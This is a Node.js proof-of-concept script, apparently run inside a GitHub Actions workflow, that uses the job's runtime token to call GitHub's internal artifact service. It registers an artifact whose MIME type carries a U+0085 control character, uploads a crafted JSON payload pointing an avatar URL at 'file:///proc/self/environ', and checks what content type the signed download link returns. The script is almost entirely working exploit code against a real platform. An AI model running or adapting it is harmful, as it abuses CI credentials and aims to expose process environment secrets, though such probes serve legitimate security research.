const crypto = require('node:crypto');

module.exports = async function probe({github, context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  if (!runtimeToken || !resultsUrl) throw new Error('Actions runtime variables unavailable');

  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  if (!scope) throw new Error('Actions Results scope unavailable');
  const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');
  const base = new URL(resultsUrl).origin;
  const service = 'github.actions.results.api.v1.ArtifactService';
  const artifactName = 'cassette.json';
  const mimeType = 'application/json\u0085';

  async function twirp(method, body) {
    const response = await fetch(`${base}/twirp/${service}/${method}`, {
      method: 'POST',
      headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    const data = await response.json();
    if (!response.ok) throw new Error(`${method} HTTP ${response.status}: ${JSON.stringify(data).slice(0, 300)}`);
    return data;
  }

  const ids = {workflow_run_backend_id: workflowRunBackendId, workflow_job_run_backend_id: workflowJobRunBackendId};
  const created = await twirp('CreateArtifact', {...ids, name: artifactName, version: 7, mime_type: mimeType});
  if (!created.ok) throw new Error('CreateArtifact returned not ok');
  const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl;
  if (!signedUploadUrl) throw new Error('CreateArtifact did not return signed upload URL');
  console.log('CreateArtifact accepted the MIME containing U+0085');

  async function putBlob(body) {
    const response = await fetch(signedUploadUrl, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/octet-stream',
        'x-ms-version': '2025-01-05',
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': 'application/json',
      },
      body,
    });
    if (!response.ok) {
      const errorCode = response.headers.get('x-ms-error-code') || 'unknown';
      throw new Error(`Azure PUT HTTP ${response.status}: ${errorCode}`);
    }
  }

  const fullName = id => `${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`;
  const payload = id => Buffer.from(JSON.stringify({full_name: fullName(id), owner: {login: context.repo.owner, avatar_url: 'file:///proc/self/environ'}}));
  const placeholder = payload('00000000000');
  await putBlob(placeholder);
  const finalized = await twirp('FinalizeArtifact', {...ids, name: artifactName, size: String(placeholder.length)});
  if (!finalized.ok) throw new Error('FinalizeArtifact returned not ok');
  const artifactId = String(finalized.artifact_id || finalized.artifactId);
  if (!/^\d+$/.test(artifactId)) throw new Error('No numeric artifact ID returned');
  const finalPayload = payload(artifactId);
  await putBlob(finalPayload);
  console.log(`Artifact ID: ${artifactId}`);
  console.log(`Payload SHA-256: ${crypto.createHash('sha256').update(finalPayload).digest('hex')}`);

  const downloadUrl = `https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${artifactId}/zip`;
  const first = await fetch(downloadUrl, {
    redirect: 'manual',
    headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
  });
  console.log(`GitHub download status: ${first.status}`);
  const location = first.headers.get('location');
  if (location) {
    console.log(`Signed rsct: ${new URL(location).searchParams.get('rsct')}`);
    const raw = await fetch(location);
    const bytes = Buffer.from(await raw.arrayBuffer());
    console.log(`Raw status: ${raw.status}; MIME: ${JSON.stringify(raw.headers.get('content-type'))}`);
    console.log(`Raw SHA-256: ${crypto.createHash('sha256').update(bytes).digest('hex')}`);
    console.log(`Raw body matches: ${bytes.equals(finalPayload)}`);
  }
};
